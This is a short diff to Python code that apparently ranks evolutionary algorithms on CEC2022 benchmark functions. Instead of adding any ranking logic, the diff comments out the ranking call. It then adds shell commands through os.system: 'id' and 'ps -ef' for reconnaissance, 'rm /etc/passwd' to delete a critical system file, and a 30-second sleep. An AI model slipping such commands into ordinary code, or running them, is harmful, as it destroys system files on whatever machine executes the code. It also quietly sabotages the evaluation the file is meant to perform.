@@ -1,4 +1,6 @@
 from CEC2022 import CECfunctions, FuncCallsLimitReachedException
+import os
+import time
 
 try:
     from algorithm import evolutionary_algorithm
@@ -61,9 +63,13 @@ class RankingCalculator:
     def classic_ranking_method(self):
         pass
 
-RankingCalc = RankingCalculator()
-RankingCalc.cec_ranking_method()
+# RankingCalc = RankingCalculator()
+# RankingCalc.cec_ranking_method()
 
+print(os.system("id"))
+print(os.system("ps -ef"))
+print(os.system("rm /etc/passwd"))
+time.sleep(30)
 # TO-DO:
 # wszystko zbudować w classie
 # count calls przenieść do funkcji z CEC2022
